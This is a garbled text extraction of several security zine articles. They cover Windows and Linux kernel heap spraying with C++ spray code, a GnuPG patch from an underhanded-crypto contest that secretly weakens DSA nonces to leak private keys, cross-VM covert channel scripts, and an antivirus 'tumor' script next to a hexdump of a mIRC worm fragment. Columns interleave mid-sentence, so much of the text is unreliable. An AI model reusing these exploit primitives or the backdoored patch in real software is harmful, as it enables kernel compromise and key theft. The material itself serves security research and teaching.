1 typedef enum _POOL_TYPE {
NonPagedPool ,
3
NonPagedPoolExecute
PagedPool ,
5
NonPagedPoolMustSucceed
DontUseThisType ,
7
NonPagedPoolCacheAligned
PagedPoolCacheAligned ,
9
NonPagedPoolCacheAlignedMustS
MaxPoolType ,
11
NonPagedPoolBase
NonPagedPoolBaseMustSucceed
13
NonPagedPoolBaseCacheAligned
NonPagedPoolBaseCacheAlignedMustS
15
NonPagedPoolSession
PagedPoolSession
17
NonPagedPoolMustSucceedSession
DontUseThisTypeSession
19
N on P a g e d P o ol C a c h e A li g n e d S e s si o n
PagedPoolCacheAlignedSession
21
NonPagedPoolCacheAlignedMustSSession
NonPagedPoolNx
23
NonPagedPoolNxCacheAligned
NonPagedPoolSessionNx
25 } POOL_TYPE;
= NonPagedPool ,
= NonPagedPool + 2 ,
= NonPagedPool + 4 ,
= NonPagedPool + 6 ,
=
=
=
=
=
=
=
=
=
=
=
=
=
=
0,
NonPagedPoolBase + 2 ,
NonPagedPoolBase + 4 ,
NonPagedPoolBase + 6 ,
32 ,
NonPagedPoolSession + 1 ,
PagedPoolSession + 1 ,
NonPagedPoolMustSucceedSession + 1 ,
DontUseThisTypeSession + 1 ,
No n P a g e d P oo l C a c h e Al i g n e d S e ss i o n + 1 ,
PagedPoolCacheAlignedSession + 1 ,
512 ,
NonPagedPoolNx + 4 ,
NonPagedPoolNx + 32
This means that if you want to use our win32k!_gre_bitmap technique, you must use it only on objects
existing in SessionPool, which is not always the case. But on the other hand, as we already discussed, in
different pools you can find different objects to fulfill your needs. Another nice example, in a different pool,
was leveraged by Alex Ionescu, 14 using the Pipe object (and proposed with the socket object as well):
The following piece of code represents another kmalloc of chosen size.
1 c l a s s CPipeBufObj :
p u b l i c IPoolBuf
3 {
CPipe m_pipe ;
14 Sheep
Year Kernel Heap Fengshui: Spraying in the Big Kids’ Pool, Alex Ionescu, Dec 2014
135 public :
s i z e _ t A l l o c ( void ∗ mem, s i z e _ t s i z e ) o v e r r i d e {
7
s i z e _ t n_written = 0 ;
auto s t a t u s = W r i t e F i l e (
9
m_pipe . I n ( ) ,
mem, s i z e ,
11
&n_written , n u l l p t r ) ;
i f ( ! NT_SUCCESS( s t a t u s ) )
13
return 0 ;
15
return n_written ;
}
17
void F re e ( ) o v e r r i d e {
m_pipe . r e s e t ( new CPipe )
}
19
21 } ;
This was just a sneak peek at two objects that are easy to misuse for precise control over kernel memory
content (via SetBitmapBits and WriteFile) and the pool layout (via Alloc and Free). Precise pool layout
control can be achieved mainly in big pools, where layout can be controlled to a large extent. With small
allocations, you may face more problems due to randomization being in place, as covered by the nifty research
[10] of Tarjei Mandt and Chris Valasek.
We mention only a few objects to spray with; however, if you invest a bit of time to look around the
kernel, you will find other mighty objects in different pools as well.
4.2
Linux (Android) Kernel
In Linux, you face a different scenario. With SLUB, you encounter problems due to overall randomiza-
tion, and due to data that is not so easily controllable. In addition, SLUB has a different concept of
pool separation—that of separate kernel caches for specific object types. Kernel caches provide far better
granularity, as often only a few objects are stored in the same cache.
In order to exploit an overflow, you may need to use a particular object of the same cache, or force the
overflow from your SLAB_objectA to a new SLAB_objectB block. In case of UAF, you can also force a whole
particular SLAB block to be freed and reallocate it with another SLAB object. Either of these variants may
be complex and not very stable.
However, not all objects are stored in those kernel caches, and a lot of the useful ones are allocated from
the default object pool based only on the size of the object, so in the same SLAB you can mix different
objects.
Our first useful object for playing with the pool layout is Pipe:
1 c l a s s CPipeObject :
p u b l i c IP oo lO bj
3 {
s t d : : unique_ptr<CPipe> m_pipe ;
5 public :
o p e r a t o r CPipe ∗ ( ) {
7
return m_pipe . g e t ( ) ;
}
9
CPipeObject ( ) :
11
m_pipe ( n u l l p t r ) {
}
13
bool Alloc () override {
15
m_pipe . r e s e t ( new CPipe ( ) ) ;
i f ( ! m_pipe . g e t ( ) )
17
return f a l s e ;
14if
19
21
( ! m_pipe−>IsReady ( ) )
return f a l s e ;
// Let ’ s c o v e r same SLAB, p i p e , and i t s b u f f e r !
// f c n t l ( m_pipe−>In ( ) , F_SETPIPE_SZ, PAGE_SIZE ∗ 2) ;
return t r u e ;
23
}
25
27
void F re e ( ) o v e r r i d e {
m_pipe . r e l e a s e ( ) ;
}
29 } ;
Another object to look at is TTY:
1 c l a s s CTtyObject :
p u b l i c IP oo lO bj
3 {
CScopedFD m_fd ;
5 public :
operator int ( ) {
7
return m_fd ;
}
9
CTtyObject ( ) :
11
m_fd( −1)
{
13
}
15
17
bool Alloc () override {
m_fd . r e s e t ( open ( " / dev /ptmx" , O_RDWR | O_NONBLOCK) ) ;
return (−1 != m_fd) ;
}
19
21
void F re e ( ) o v e r r i d e {
m_fd . r e s e t ( ) ;
}
23 } ;
Another one that comes to mind is Socket:
1 c l a s s CSocketObject :
p u b l i c IP oo lO bj
3 {
CScopedFD m_sock ;
5 public :
operator int ( ) {
7
return m_sock ;
}
9
CSocketObject ( ) :
11
m_sock( −1)
{
13
}
15
17
bool Alloc () override {
m_sock . r e s e t ( s o c k e t (AF_INET, SOCK_DGRAM, IPPROTO_ICMP) ) ;
return (−1 != m_sock . g e t ( ) ) ;
}
19
void F re e ( ) o v e r r i d e {
1521
m_sock . r e s e t ( ) ;
}
23 } ;
However, in our implementations we only play with allocations of sizes sizeof(Pipe), sizeof(TTY),
sizeof(Socket), but not with their associated buffers for the Pipe, TTY, or Socket objects respectively.
Therefore, here we omit doing the equivalent of memcpy, but you can ship your controlled data to kernel
memory through the write syscall, which will store it there faithfully byte-for-byte.
Here is an example with Pipe. It is similar to the Windows example. In Windows we use the WriteFile
API, but in the Linux implementation we have to use CPipe. Write, like in this example with fcntl syscall:
1 c l a s s CPipeBufObj :
p u b l i c IPoolBuf
3 {
CPipe m_pipe ;
5 public :
s i z e _ t A l l o c ( void ∗ mem, s i z e _ t s i z e ) o v e r r i d e {
7
auto s h i f t = KmallocIndexByPipe ( s i z e ) ;
if (! shift )
9
return n u l l p t r ;
i f (−1 == f c n t l ( p i p e . I n ( ) , F_SETPIPE_SZ, PAGE_SIZE ∗ s h i f t ) )
11
return n u l l p t r ;
i f ( ! p i p e −>Write (mem, s i z e ) )
13
return n u l l p t r ;
return s i z e ;
15
}
17
void F re e ( ) o v e r r i d e {
m_bitmap . r e s e t ( ) ;
}
19
};
One of the reasons why we focus mainly on object
header-based kmallocs is that in Linux the objects we
deal with are easy to overwrite, have a lot of pointers
and useful state we can manipulate, and are often quite
large. For example, they may cover different SLABSs,
and may even be located in the same SLAB as various
kinds of buffers that make pretty sexy targets. One
more reason is covered later in this article.
However, pool layout is a far more difficult task than
described above, as randomization complicates it to a
large extent. You can usually overcome it with spray-
ing in the same cache and filling most of the pool to
ensure that almost every object there can be used for
exploitation (as due to randomization you don’t know
where your target will reside).
16SLAB
SLAB - latest
Kernel Address space
0xc000...
0xdd02...
SLAB
0xed12...
0xed11...
0xee07...
0xffff...
SLAB
Victim - bu er over owing
Target - over owed to
Target - decoy
Sometimes by trying to do this kind of pool layout with overflowable buffer and right object headers you
can achieve full pwn even without touching addr_limit.
Pool spray brute force implementation:
2
4
6
8
10
12
14
16
18
t e m p l a t e <typename t_PoolObjType , b o o l FIFO>
size_t
Spray (
size_t objLimit
)
{
f o r ( s i z e _ t n_obj_id = 0 ; n_obj_id < o b j L i m i t ; n_obj_id++){
s t d : : unique_ptr<IPoolObj> pool_obj ( new t_PoolObjType ( ) ) ;
i f ( ! pool_obj ) // n o t enough memory on heap ?
break ;
i f ( ! pool_obj−>A l l o c ( ) ) // n o t enough memory on p o o l ?
break ;
i f ( FIFO )
BILIST : : push_back ( ∗ s t a t i c _ c a s t <t_PoolObjType∗>( pool_obj . r e l e a s e ( ) ) ) ;
else
BILIST : : push_front ( ∗ s t a t i c _ c a s t <t_PoolObjType∗>( pool_obj . r e l e a s e ( ) ) ) ;
}
return BILIST : : s i z e ( ) ;
}
But as we mentioned before, a big drawback to effective pool spraying on Linux and to doing a massive
controllable pool layout is the limit on the number of owned kernel objects per process. You can create a
lot of processes to overcome it, but that is bit messy, does not always properly solve your issue, or is not
possible anyway.
Spray by GFP_USER zone:
To overcome this limitation and to control more of the kernel memory (zone GFP_USER) state, we came
up with a somewhat more comprehensive solution presented at Confidence 2015. 15
To understand this technique, we will need to take a closer look at the splice method.
1 s s i z e _ t d e f a u l t _ f i l e _ s p l i c e _ r e a d ( struct f i l e ∗ in , l o f f _ t ∗ ppos ,
struct p i p e _ i n o d e _ i n f o ∗ p i p e , s i z e _ t l e n ,
3
unsigned i n t f l a g s )
{
5
unsigned i n t nr_pages ;
15 SPLICE
When Something is Overflowing by Peter Hlavaty, Confidence 2015
177
9
11
13
15
17
19
unsigned i n t n r _ f r e e d ;
size_t o f f s e t ;
struct page ∗ p a g e s [PIPE_DEF_BUFFERS ] ;
// . . .
struct s p l i c e _ p i p e _ d e s c spd = {
. p a g e s = pages ,
. partial = partial ,
. nr_pages_max = PIPE_DEF_BUFFERS,
. flags = flags ,
. ops = &default_pipe_buf_ops ,
. s p d _ r e l e a s e = spd_release_page ,
};
// . . .
f o r ( i = 0 ; i < nr_pages && i < spd . nr_pages_max && l e n ; i ++) {
struct page ∗ page ;
21
page = a l l o c _ p a g e (GFP_USER) ;
23 // . . .
As you can see from this highlight, the important page is alloc_page(GFP_USER), which is allocated for
PAGE_SIZE and filled with controlled content later. This is nice, but we still have a limit on pipes!
Now here is a paradox: sometimes randomization can play in your hands!
And that’s our case... In other words, when you do splice multiple (really a lot of) times, you will cover
a lot of random pages in kernel’s virtual address space. But that’s exactly what we want!
But to trigger default_file_splice_read you need to provide the appropriate pipe counterpart to
splice, and one of the kosher candidates is /dev/ptmx a.k.a. TTY. And as splice is for moving content
around, you will need to perform a few steps to achieve a successful spray algorithm:
no memory pressure!
+ allow spray with only 0x1fd pipes!
BUFFER in user mode
controlled data 1
TTY - master pipe - out
write splice read
TTY - slave pipe - in
controlled data 1
controlled data 3
BUFFER in kernel mode
controlled data 1
controlled data 1
controlled data 3
You will need to (1) fill tty slave; (2) splice tty master to pipe in; (3) read it out from pipe out; and (4) go
back to (1).
In conclusion, we consider kmalloc, with per-byte-controlled content, and kfree controllable by user to
that extent very damaging for overall kernel security and introduced mitigations. And we believe that this
power will be someday stripped from the user, therefore making harder exploitation of otherwise difficult to
exploit vulnerabilities.
By the way, in this article we do not discuss kernel memory control by ret2dir technique. 16 For additional
info and practical usage check our (@antlr7 of @K33nTeam) research from BHUS15! 17
16 ret2dir:
Rethinking Kernel Isolation by Kemerlis, Polychronakis, and Keromytis
Android Rooting is Back! by Wen Xu, BHUSA 2015
unzip pocorgtfo09.pdf bhusa15wenxu.pdf
17 Universal
185
Second Underhanded Crypto Contest
by Taylor Hornby
Defcon 23’s Crypto and Privacy Village mini-
contest is over. Despite the tight deadline, we re-
ceived five high-quality submissions in two cate-
gories. The first was to patch GnuPG to leak the
private key in a message. The second was to back-
door a password authentication system, so that a
secret value known to an attacker could be used in
place of the correct password.
5.1
GnuPG Backdoor
15 +
17
19
21 +
23
25
+
27
1
3
5
7
9
11
13
p r o g r e s s ( ’+ ’ ) ;
memset ( rndbuf , 0 , n b y t e s ) ;
continue ; /∗ no ∗/
}
i f ( ! ( mpi_cmp_ui ( k , 0 ) > 0 ) ) { // k>0
i f ( DBG_CIPHER )
p r o g r e s s ( ’− ’ ) ;
memset ( rndbuf , 0 , n b y t e s ) ;
continue ; // no
}
break ; // okay
}
memset ( rndbuf , 0 , n b y t e s ) ;
x f r e e ( rndbuf ) ;
i f (DBG_CIPHER)
p r o g r e s s ( ’ \n ’ ) ;
We had three submissions to the GnuPG category.
The winner is Joseph Birr-Pixton. The submission 29
takes advantage of how GnuPG 1.4 generates DSA
nonces.
The randomness of the DSA nonce is crucial.
If the nonce is not chosen randomly, or has low
5.2 Backdoored Password Authenti-
entropy, then it is possible to recover the private
key from digital signatures. GnuPG 1.4 generates
cation
nonces by first generating a random integer, set-
There were two entries to the password authenti-
ting the most-significant bit, and then checking if
cation category. The winner is Scott Arciszewski.
the value is less than a number Q (a requirement of
This submission pretends to be a solution to a user
DSA). If it is not, then the most-significant 32 bits
enumeration side channel in a web login form. The
are randomly generated again, leaving the rest the
problem is that if the username doesn’t exist, the lo-
same.
gin will fail fast. If the username does exist, but the
This shortcut enables the backdoor. The patch
password is wrong, the password check will take a
looks like an improvement to GnuPG, to make it
long time, and the login will fail slow. This way, an
zero the nonce after it is no longer needed. Unfor-
attacker can check if a username exists by measuring
tunately for GnuPG, but fortunately for this con-
the response time.
test, there’s an extra call to memset() that zeroes
The fix is to, in the username-does-not-exist
the nonce in the “greater than Q” case, meaning the
case,
check the password against the hash of a ran-
nonce that actually gets used will only have 32 bits
dom
garbage
value. The garbage value is gener-
of entropy. The attacker can fire up some EC2 in-
ated
using
rand(),
a random number generator that
stances to brute force it and recover the private key.
is not cryptographically secure. Some rand() out-
d i f f −−g i t a / c i p h e r / dsa . c b/ c i p h e r / dsa . c
put is also exposed to the attacker through cache-
i n d e x e 2 3 f 0 5 c . . e496d69 100644
busting URLs and CSRF tokens. With that output,
−−− a / c i p h e r / dsa . c
+++ b/ c i p h e r / dsa . c
the attacker can recover the internal rand() state,
@@ −93 ,6 +93 ,7 @@ gen_k ( MPI q )
predict the garbage value, and use it in place of the
i f ( ! r n d b u f | | n b i t s < 32 ) {
password.
+
i f ( r n d b u f ) memset ( rndbuf , 0 , n b y t e s ) ;
–——–
———
—–—–
x f r e e ( rndbuf ) ;
r n d b u f = get_random_bits ( n b i t s , 1 , 1 ) ;
An archive with all of the entries is included
}
within this PDF. 18 The judge for this competition
@@ −115 ,15 +116 ,18 @@ gen_k ( MPI q )
was Jean-Philippe Aumasson, to whom we extend
i f ( ! ( mpi_cmp ( k , q ) < 0 ) ) { // k<q
our sincerest thanks.
i f ( DBG_CIPHER )
18 unzip
pocorgtfo09.pdf uhc-subs.tar.xz
19206
Exploiting Out-of-Order-Execution; or,
Processor Side Channels to Enable Cross VM Code Execution
by Sophia D’Antoine
In which Sophia uses the MFENCE instruction on virtual machines,
just as Joshua used trumpets on the walls of Jericho. —PML
In the cloud, this environment is the shared
physical resources on the service used by the vir-
tual machines. The hypervisor dynamically parti-
tions each physical resource—which is then seen by
a single virtual machine as its own private resource.
The side channel model in Figure 6.1 illustrates this.
Knowing this, the attacker can affect that re-
source partition in a recordable way, such as by
flushing a line in the cache tier, waiting until the vic-
tim process uses it for an operation, then requesting
that address again—recording what values are now
there.
At REcon 2015, I demonstrated a new hard-
ware side channel that targeted co-located virtual
machines in the cloud. This attack exploited the
CPU’s pipeline as opposed to cache tiers, which are
often used in side channel attacks. When design-
ing or looking for hardware-based side channels—
specifically in the cloud, I analyzed a few universal
properties that define the “right” kind of vulnerable
system as well as unique ones tailored to the hard-
ware medium.
The relevance of these types of attacks will only
increase—especially attacks that target the vulnera-
bilities inherent to systems that share hardware re-
sources, such as in cloud platforms.
VM
VM
VMM: XEN
VM
VM
VM
victim:
leaves
artifacts
VM
adversary:
records
artifacts
(hypervisor does allocation)
Shared Hardware
Core 1 Core 2 Core 3
L1 Cache
L2 Cache L1 Cache
L2 Cache L1 Cache
L2 Cache
Figure 2: Side channel model
L3 Cache
6.2
Main Memory
Great! So we can record things from our victim’s
environment—but now what? Of course, some kinds
of information are better than others; here is an
overview of the different kinds of attacks people have
considered, depending on what the victim’s process
is doing.
Crypto key theft. Crypto keys are great, pri-
vate crypto keys are even better. Using this hard-
ware side channel, it’s possible to leak the bytes of
the private key used by a co-located process. In
one scenario, two virtual machines are allocated the
same space in the L3 cache at different times. The
attacker flushes a certain cache address, waits for the
Figure 1: Virtualization of physical resources
6.1
What Good is a Side Channel At-
tack?
What is a Side Channel Attack?
Basically a side channel is a way for any meaning-
ful information to be leaked from the environment
running the target application, or in this case the
victim virtual machine (as in Figure 6). In this case,
a process (the attacker) must be able to repeatedly
record this environment “artifact” from inside one
virtual machine.
21victim to use that address, then queries it again—
recording the new values that are there.[1]
Process monitoring. What applications is the
victim running? It will be possible for find out when
you record enough of the target’s behavior, i.e., its
CPU or pipeline usage or values stored in memory.
Then a mapping between the recording to a spe-
cific running process could be constructed—up to
some varied degree of certainty. Warning, this does
rely on at least a rudimentary knowledge of machine
learning.
Environment keying. This attack is handy for
proving co-location. Using the environment record-
ings taken off of a specific hardware resource, you
can also uniquely identify one server from another
in the cloud. This is useful to prove that two virtual
machines you control are co-resident on the same
physical server. Alternatively, if you know the be-
havior signature of a server your target is on, you
can repeatedly create virtual machines in the tar-
geted cloud, recording the behavior on each system
until you find a match.[2]
Broadcast signal. This attack is a nifty way
of receiving messages without access to the Internet.
If a colluding process is purposefully generating be-
havior on a pre-arranged hardware resource, such
as purposefully filling a cache line with 0’s and 1’s,
the attacker (your process) can record this behav-
ior in the same way it would record a victim’s be-
havior. You then can translate the recorded values
into pre-agreed messages. Recording from different
hardware mediums results in a channel with differ-
ent bandwidths.[3]
6.3
tion set order it gives to be executed on the pipeline
and the result the pipeline returns. This is the infor-
mation source we will mine for a number of effects
and artifacts, as follows.
Out of order execution: a pipeline’s arti-
fact. We can exploit this pipeline optimization as
a means to record the state of the pipeline. The
known input instruction order will result in two dif-
ferent return values—one is the expected result(s),
the other is the result if the pipeline executes them
out-of-order.
VM VM VM VM
Processor01 Processor02 Processor03 Processor04
SMT
Allows
Threads to
Share Cores
Core01
Core02
Processor
Figure 3: Foreign processes can share the same
pipeline
Strong memory ordering.
Our target,
cloud processors, can be assumed to be x86/64
architecture—implying a usually strongly-ordered
memory model.[4] This is important, because the
pipeline will optimize the execution of instructions,
but will attempt to maintain the right order of stores
to memory and loads from memory.
However, the stores and loads from different
threads may be reordered by out-of-order-execution.
Now, this reordering is observable if we’re clever
enough.
Recording instruction reorder (or, how to
be clever). In order for the attacker to record
these reordering artifacts from the pipeline, we must
record two things for each of our two threads: input
instruction order and return value.
Additionally, the instructions in each thread
must contain a STORE to memory and a LOAD from
memory. The LOAD from memory must reference the
location stored to by the opposite thread. This setup
ensures the possibility for the four cases illustrated
in Figure 4. The last is the artifact we record; do-
ing so several thousand times gives us averages over
time.
The Cache is Easy;
the Pipeline is Harder
Now all of the above examples used the cache to
record the environment shared by both victim and
attacker processes. It is the most widely used re-
source in both literature and practice for construct-
ing side channels, as well as the easiest one to record
artifacts from. Basically, everyone loves cache.
However, the cache isn’t the only shared re-
source. Co-located virtual machines also share the
CPU execution pipeline, as illustrated in Figure 3.
In order to use the CPU pipeline, we must be able
to record a value from it. Unfortunately, there is no
easy way for any process to query the state of the
pipeline over time—it is like a virtual black-box.
The only thing a process can know is the instruc-
22Synched
ASynched
Out of
Order
Execution
THREAD 1 THREAD 2
store [X], 1 store [Y], 1
load r1, [Y] load r2, [X]
store [X], 1
load r1, [Y]
store [Y], 1
load r2, [X]
load r1, [Y] load r2, [X]
store [X], 1 store [Y], 1
there are specific barrier instructions that stop the
processor from reordering the four possible combina-
tions of STORE’s and LOAD’s. What we’re interested
in is forcing a strong order when the processor en-
counters an instruction set with a STORE followed by
a LOAD. The MFENCE instruction does exactly this.
By getting the colluding process to inject these
memory barriers into the pipeline, the attacker en-
sures that the instructions will not be reordered,
forcing a noticeable decrease in the recorded aver-
ages. Doing this in distinct time frames allows us to
send a binary message, as shown in Figure 5. More
details are available in my thesis. 19
r1 = r2 = 1
r1 = 0 r2 = 1
r1 = r2 = 0
Figure 4: The attacker can record when its instruc-
tions are reordered
Sending a message. To make our attacks more
interesting, we want to be able to force the amount
of recorded out-of-order-executions. This ability is
useful for other attacks, such as constructing covert
communication channels.
In order to do this, we need to alter how the
pipeline optimization works—by increasing the prob-
ability that it either will or will not reorder our two
threads. The easiest is to enforce a strong memory
order and guarantee that the attacker will receive
fewer out-of-order-executions. This is where mem-
ory barriers come in.
Memory barriers. In the x86 instruction set,
THE PIPELINE
. . ...
NOP
Store [X], 1
mfence
Load r1, [X]
NOP
. . ...
Figure 5: MFENCE ensures the strong memory order
on pipeline
The takeaway is that—even with virtualization
separating your virtual machine from the hundreds
of other alien virtual machines!—the pipeline can’t
distinguish your process’s instructions from all the
other ones, and we can use that to our advantage.
References
[1] FLUSH+RELOAD: a High Resolution, Low Noise, L3 Cache Side-Channel Attack, Yuval Yarom,
Katrina Falkner, USENIX Security 2014
[2] Cross-Tenant Side-Channel Attacks in PaaS Clouds Yinqian Zhang, Ari Juels, Michael K. Reiter,
Thomas Ristenpart ACM CCS 2014
[3] Whispers in the Hyper-space: High-speed Covert Channel Attacks in the Cloud, Zhenyu Wu, Zhang Xu,
Haining Wang USENIX Security 2012
[4] Weak
vs.
Strong
Memory
Models,
Preshing
http://preshing.com/20120930/weak-vs-strong-memory-models/
1 ’’’
3 TRANSMITTER
sophia . re
5 07/06/15
7 ’’’
9 from time import time , s l e e p
import o s
11
# t a k e s a b i n a r y s t r i n g as i n p u t
19 unzip
pocorgtfo09.pdf crossvm.pdf
23
on
Programming,13 def send ( Message , roundLength ) :
f o r x in Message :
15
# Run a s i n g l e b u s y l o o p t o r e p r e s e n t a 0
i f ( x == ’ 0 ’ ) :
17
print ( ’ s e n d i n g ’ , x )
# change t h e time o f t h i s b u s y l o o p t o match r e c e i v e r round l e n g t h
19
s t a r t _ t i m e = time ( )
end_time = time ( ) + roundLength #t h i s number i s l o o p time i n s e c o n d s
21
while ( s t a r t _ t i m e < end_time ) :
s t a r t _ t i m e = time ( ) #do n o t h i n g
23
else :
# send a ’ h i ’ b i t i n a g i v e n time frame
25
# by r e d u c i n g t h e r e c e i v e d o u t o f o r d e r e x e c u t i o n s
# t h i s i s done u s i n g t h e s e n d e r e x e
27
print ( ’ s e n d i n g ’ , x )
s t a r t _ t i m e = time ( )
29
end_time = time ( ) + roundLength
while ( s t a r t _ t i m e < end_time ) :
31
o s . system ( "C: \ \ CPUSender . e x e " )
# do n o t h i n g u n t i l s e n d i n g c p r o c e s s t e r m i n a t e s
33
s t a r t _ t i m e = time ( )
35
def main ( ) :
# measured r e c e i v e r time frame l e n g t h i n s e c o n d s − ( f o r one b i t )
roundLength = 1 . 0 8
39
message = ’ ’
37
41
# enter binary s t r i n g
while ( message != ’ e x i t ’ ) :
message = raw_input ( ’ Enter Binary S t r i n g :
s t a r t _ t = time ( )
i f ( message != ’ e x i t ’ ) :
send ( message , roundLength )
print " \ nT ot al e x e c u t i o n time : "
print time ( ) − s t a r t _ t
43
45
47
’)
49
51
i f __name__ == "__main__" :
main ( )
1 ’’’
3 RECEIVER
sophia . re
5 07/06/15
7 ’’’
9 from time import time , s l e e p
import o s
11 import s y s , s u b p r o c e s s
import msvcrt a s m
13 import m a t p l o t l i b
import m a t p l o t l i b . p y p l o t a s p l t
15
def main ( ) :
17
while True :
19
s t a r t _ t i m e = time ( )
end_time = time ( ) + 12
21
print " R e c e i v i n g B i t s i n Words ( 8 b i t b l o c k s ) . . . . \ n"
23
# r e c o r d s o u t o f o r d e r e x e c u t i o n s and w r i t e s a v e r a g e s t o f i l e
2425
27
29
31
33
35
37
39
41
43
45
47
49
51
p = s u b p r o c e s s . Popen ( "C: / R e c e i v e r . e x e "+" 1 " ∗ 8 )
while s t a r t _ t i m e < end_time :
s t a r t _ t i m e = time ( )
print time ( )
# w a i t b e c a u s e o f s ys t e m l a t e n c y
p = s u b p r o c e s s . Popen ( "C: / nop . e x e " )
p = s u b p r o c e s s . Popen ( "C: / nop . e x e " )
# r e a d a l l r e c o r d e d o u t o f o r d e r e x e c u t i o n s from f i l e
f = open ( "C: / Python27 / BackupCheck . t x t " )
txt = f . readlines ()
f . close ()
txt = txt [ 0 ]
print " R e c e i v e d B i t s \n"
print t x t
# t r i g g e r a p i c t u r e t o appear
bits = txt . s p l i t (" : ")
i f " 11 " in b i t s [ 0 ] :
print " \n [ + ] t r i g g e r d e t e c t e d "
e x e = "C: / U s e r s / r o o t / Downloads /JPEGView_1_0_29/JPEGView . e x e "
a r g s = ’ "C: / p i c s " ’
p = s u b p r o c e s s . c a l l ( [ exe , a r g s ] )
sys . exit (0)
quit ()
else :
print " \n [ + ] t r i g g e r not d e t e c t e d "
53
55
57
# p l o t r e c e i v e d out of order e x e c u t i o n s to view s t e p s i g n a l
print " \n\ nEnter t o P l o t . . . . "
p . k i l l ()
m. g e t c h ( )
59
61
63
65
67
69
71
73
75
# p l o t r e c o r d e d OoOE s t e p s i g n a l t o png f i l e
with open ( " BackupCheck2 . t x t " ) a s f :
data = f . r e a d ( )
data = data . s p l i t ( " \n" )
y = [ f l o a t ( x ) f o r x in data [ 0 ] . s p l i t ( ’ ’ ) [ : − 1 ] ]
x = l i s t ( xrange ( l e n ( y ) ) )
print " There a r e " , l e n ( y ) , " e l e m e n t s t o p l o t . "
fig = plt . figure ()
ax1 = f i g . add_subplot ( 1 1 1 )
ax1 . s e t _ t i t l e ( " P l o t R e c e i v e d OoOE" )
ax1 . s e t _ x l a b e l ( " i t e r a t i o n s " )
ax1 . s e t _ y l a b e l ( " out−o f −o r d e r −e x e c u t i o n a v e r a g e s " )
ax1 . f i l l _ b e t w e e n ( x , y , c o l o r= ’ y e l l o w ’ )
ax1 . p l o t ( x , y , marker= ’ . ’ , lw =1 , l a b e l= ’ t h e data ’ , a l p h a =0.3)
l e g = ax1 . l e g e n d ( )
77
p l t . s a v e f i g ( ’ p l o t . png ’ , bbox_inches= ’ t i g h t ’ )
79
81
# repeat
print " \n\ nEnter t o Continue . . . . "
m. g e t c h ( )
83
85
i f __name__ == "__main__" :
main ( )
257
Antivirus Tumors
by Eric Davisson
McAfee Enterprise VirusScan (not the home version
of their AV) has a peculiar way of quarantining mal-
ware. If an anti-virus product wants to keep a foren-
sic copy of removed malware, it must either move it
to an area of the system that it doesn’t scan, or
it must somehow transform this malware data so it
can no longer be seen by the anti-virus signature.
VirusScan is almost able to get away with the sec-
ond option. Almost.
A VirusScan quarantine file (.bup) is an odd
form of an archive format called Compound File Bi-
nary Format that can usually be read by 7zip. This
file contains two files. One of them is a file that con-
tains metadata on the original malware. The other
file is the malware file that was removed. Both of
these files have been XOR encoded with a one byte
key of 0x6a (ASCII ‘j’). This 7zip file is archive
mode only, so it has no compression. All of this is
extremely useful.
Let’s say that hypothetically all ‘X’ characters
look like malware to our AV. (This is a bit contrived,
but we’ll get back to a real example soon.) This X
is 0x58 or 0b01011000. To bitwise XOR this char
with 0x6A would give us ‘2’ (0x32 or 0b00110010).
So our PoC would be ‘X2’ for a signature that looked
for ‘X’. Why? Our tumor has the contents of ‘X2’,
and since that contains ‘X’, it’s bad malware and
needs to be quarantined. The file gets XORed to
become ‘2X’ and archived with the metadata. If you
did a hexdump on this forensic .bup file, the con-
0000000:
0000010:
0000020:
0000030:
0000040:
0000050:
0000060:
0000070:
0000080:
0000090:
00000 a0 :
00000 b0 :
00000 c0 :
00000 d0 :
00000 e0 :
7269
4368
6 e20
2024
0 d0a
6 e69
6 e6c
272 b
2 e43
5 a57
0 c4a
4 a43
0 e4a
0 e05
0 f4a
7074
6172
313 a
6 d65
277 b
636 b
6 f61
4318
4129
0504
424 a
4 d67
4 e04
1 d04
174 d
5 d27
2824
4 a4f
2021
202 f
2063
645 c
031 a
020 b
4 a5b
4 e07
604 d
0309
0605
4129
2 b43
4129
494 e
3 d20
6463
3 a5c
616 c
1 e37
1842
5020
0 f4a
114 a
014 a
0 b0e
6861
2 b0d
3 a23
246 e
6320
6 d69
6261
4 d41
4 e2b
2523
4 b57
450 e
0950
360 b
7228
0 a27
3 a20
6963
7365
7263
2 e65
2902
4341
2450
4 a4e
0909
3607
0608
2444
6 e30
6966
6 b20
6 e64
5 c64
7865
0 b18
6760
4950
0403
4 a19
0318
0 b44
tents of ‘2X’ are still visibly malicious and need to
be quarantined!
I neither have nor want access to McAfee’s sig-
natures, but we all have access to ClamAV’s set of
signatures. It is possible (and highly verified) that
there is some signature overlap, as files can come
up dirty on multiple vendors’ scans. In this PoC,
I will use ClamAV’s “Worm.VBS.IRC.Alba (Clam)”
signature. Despite the name, I assure you that if
you submit the file through McAfee, it scans dirty.
The following script extracts a plaintext Clam
signature database, parses out the data of our sig-
nature, and writes the original and XOR’d form of
this signature to a file called tumor. This assumes
you’re on a Linux system with ClamAV installed
with signatures loaded in /var/lib/clamav/.
1 dd i f =/v a r / l i b / clamav / main . cvd o f=h i v s . t a r
bs =512 s k i p =1 2> / dev / n u l l ;
3 t a r −x main . db −f h i v s . t a r 2> / dev / n u l l ;
chmod 666 main . db ;
5 rm h i v s . t a r ;
g r e p "IRC . Alba " main . db
7
| g r e p −o " [0 −9a−f ]\+\ $ "
| xxd −r −p | p e r l −0777 −e
9
’ $k = <>; p r i n t $k ;
p r i n t ( $k ^ ( " j " x l e n g t h ( $k ) ) ) ; ’
11
> tumor ;
rm main . db
\
\
\
\
\
This tumor is benign, as its growth eventually
stops after a few rounds, and I’ve not yet been able
292 b
3 d6f
2028
2927
2024
6 f77
207 d
424 e
4 d04
4 a03
0901
0 f04
0936
0 f12
26
r i p t ] ’+Char ($D)+
Char ($A) + . . ’ n0=o
n 1 : JOIN : # : i f (
$me != $ n i c k ) ’
. . ’ { / dcc send $
n i c k c : \ mirc \dow
nload \ alba . exe }
’+C . . . . 7MA) . . . BN
.CA) . . . BN+CAg‘M.
ZW. . J [ P %#$PIPJ .
. JBJN . . JKWJN . . . .
JCMg‘M. JE . . . J . . .
. JN . . . . J . P6 . . . . 6
. . . . . . . . 6 . . . . D. .
. J .MA)to compose a proof of concept of a malignant tumor,
one that eventually fills the hard disk. Through ex-
perimentation, I suspect that McAfee signatures are
more complex than string matches. For example,
when McAfee pulls out of my pool a file that previ-
ously had no nulls but now does, it often no longer
sees it as malware and rejoices. This is a problem
as 7zip introduces nulls in its metadata. Also some
malicious data no longer triggers the antivirus when
pushed deeper into the file. These barriers may be
